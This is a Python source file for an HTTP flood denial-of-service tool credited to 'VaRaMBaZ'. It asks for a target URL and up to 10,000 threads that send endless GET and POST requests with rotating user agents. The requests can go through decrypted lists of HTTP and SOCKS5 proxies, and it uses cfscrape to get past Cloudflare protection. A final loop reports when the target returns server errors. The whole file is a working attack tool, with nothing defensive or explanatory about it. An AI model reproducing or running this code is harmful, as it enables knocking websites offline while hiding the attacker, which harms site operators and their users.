import colorama
from colorama import Style
import threading
import random
import requests
import cfscrape
import os
import pyAesCrypt
import time

os.system("clear")

s = cfscrape.create_scraper()

#Получение User-Agent
with open('useragent') as file:
    headersp = ''.join(file.readlines()).strip().split('\n')

# Шифрование и получение прокси
filedecrypthttp = "proxyhttp.crp"
filedecryptsocks = "proxysocks.crp"
password = "0xdrqdsdwgfegvefgtruoobcdsm"


def decryptionhttp():
    buffer_size = 512 * 1024
    pyAesCrypt.decryptFile(str(filedecrypthttp), str(os.path.splitext(filedecrypthttp)[0]), password, buffer_size)
decryptionhttp()

with open('proxyhttp') as file:
    proxy_http = ''.join(file.readlines()).strip().split('\n')
os.remove("proxyhttp")

def decryptionsocks():
    buffer_size = 512 * 1024
    pyAesCrypt.decryptFile(str(filedecryptsocks), str(os.path.splitext(filedecryptsocks)[0]), password, buffer_size)
decryptionsocks()

with open('proxysocks') as file:
    proxy_socks = ''.join(file.readlines()).strip().split('\n')
os.remove("proxysocks")
# Запуск потоков

def dospause1(barrier, url):
    barrier.wait()
    dos1(url)

def dospause2(barrier, url):
    barrier.wait()
    dos2(url)

# Аттака
def dos1(target):
    while True:
        useragent = random.choice(headersp)
        header = {'user-agent': useragent}

        useragent2 = random.choice(headersp)
        header2 = {'user-agent': useragent2}

        proxyagenthttp = random.choice(proxy_http)
        proxyagentsocks = random.choice(proxy_socks)
        proxieshttphttp = {
            'http': f'http://{proxyagenthttp}'
        }
        proxieshttphttps = {
            'https': f'http://{proxyagenthttp}'
        }
        proxiessockshttp = {
            'http': f'socks5://{proxyagentsocks}'
        }
        proxiessockshttps = {
            'https': f'socks5://{proxyagentsocks}'
        }

        try:
            s.get(target, headers=header, proxies=proxieshttphttp)
        except:
            pass

        try:
            s.post(target, headers=header2, proxies=proxieshttphttp)
        except:
            pass

        try:
            s.get(target, headers=header, proxies=proxieshttphttps)
        except:
            pass

        try:
            s.post(target, headers=header2, proxies=proxieshttphttps)
        except:
            pass

        try:
            s.get(target, headers=header, proxies=proxiessockshttp)
        except:
            pass

        try:
            s.post(target, headers=header2, proxies=proxiessockshttp)
        except:
            pass

        try:
            s.get(target, headers=header, proxies=proxiessockshttps)
        except:
            pass

        try:
            s.post(target, headers=header2, proxies=proxiessockshttps)
        except:
            pass
        

def dos2(target):
    while True:
        useragent = random.choice(headersp)
        header = {'user-agent': useragent}
        try:
            requests.get(target, headers=header)
            requests.post(target, headers=header)
        except:
            pass


threads = 20
print("\\-\          //-/    //-/\\-\       ==========     ||====\-\   //=====\-\ ||======-\     ")
print(" \\-\        //-/    //-/  \\-\     ||-|     ||-|   ||    |=-|  ||     |-| || _____|-|    ")
print("  \\-\      //-/    //-/    \\-\    ||-|     ||-|   ||    |=-|  ||     |-| ||____             ")
print("   \\-\    //-/    //========\\-\   ||=========     ||    |=-|  ||     |-|      || |-|    ")
print("    \\-\  //-/    //-/        \\-\  ||-|     \\-\    ||    |=-|  ||     |-|   ___|| |-|   ")
print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/-/ ||======|-| \n")
print("Creator: VaRaMBaZ")
print("Version: 1.6.5; Add check site status \n")

url = input("URL: ")
if not url.__contains__("http"):
    exit(colorama.Fore.RED + "URL doesnt contains http or https!")

if not url.__contains__("."):
    exit(colorama.Fore.RED + "Invalid domain")

try:
    threads = int(input("Threads[max 10000]: "))
except ValueError:
    exit(colorama.Fore.RED + "Threads count is incorrect!")

if threads == 0 or threads > 10000:
    exit(colorama.Fore.RED + "Threads count is incorrect!")

bar = threading.Barrier(threads)
proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
print("")

print(colorama.Fore.YELLOW + "Starting threads...")
if proxyuseage == 1:
    for i in range(0, threads):
        thr = threading.Thread(target=dospause1, args=(bar, url, ))
        thr.start()
else:
    for i in range(0, threads):
        thr2 = threading.Thread(target=dospause2, args=(bar, url, ))
        thr2.start()
print(colorama.Fore.GREEN + "All threads are running!")
print(Style.RESET_ALL)

while True:
    useragent = random.choice(headersp)
    header = {'user-agent': useragent}
    
    checksite = requests.post(url, headers=header)
    if checksite.status_code >= 500:
        statustext = "OFFLINE"
    elif checksite.status_code >= 200:
        statustext = "ONLINE"
    print("\r Check Site | Status: ", checksite.status_code, " | ", statustext, end='')